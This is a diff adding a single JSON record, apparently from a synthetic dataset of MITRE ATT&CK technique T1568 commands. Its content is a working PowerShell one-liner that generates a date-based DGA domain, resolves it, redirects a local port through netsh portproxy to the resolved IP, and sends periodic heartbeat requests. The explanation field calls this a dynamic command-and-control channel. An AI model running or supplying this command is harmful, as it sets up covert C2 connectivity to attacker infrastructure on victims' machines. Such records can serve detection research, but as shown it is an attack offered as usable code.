@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$d='cdn'+(Get-Date -Format 'MMdd')+(Get-Random -Min 10 -Max 99)+'.net';for($i=0;$i -lt 3;$i++){try{$a=Resolve-DnsName -Name $d -Type A -Server 1.1.1.1 -ErrorAction Stop;$pick=$a|Get-Random;$ip=$pick.IPAddress;$ttl=[int]$pick.TTL;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=4444 connectaddress=$ip connectport=443;Invoke-WebRequest -Uri 'http://127.0.0.1:4444/heartbeat' -UseBasicParsing -Headers @{Flux='1';Dom=$d;IP=$ip} -TimeoutSec 5;Start-Sleep -Seconds ([Math]::Min(($ttl+5),60))}catch{Start-Sleep -Seconds 5}}",
+  "explanation": "Targets a DGA domain likely backed by fast-flux; periodically re-resolves and updates the portproxy to whichever IP is active within TTL jitter to maintain a dynamic C2 channel.",
+  "rationale_steps": [
+    "Leverage fast-flux behavior by honoring TTL and rotating IP endpoints.",
+    "Continuously refresh the portproxy mapping to sustain connectivity via dynamic resolution."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-f3797414",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
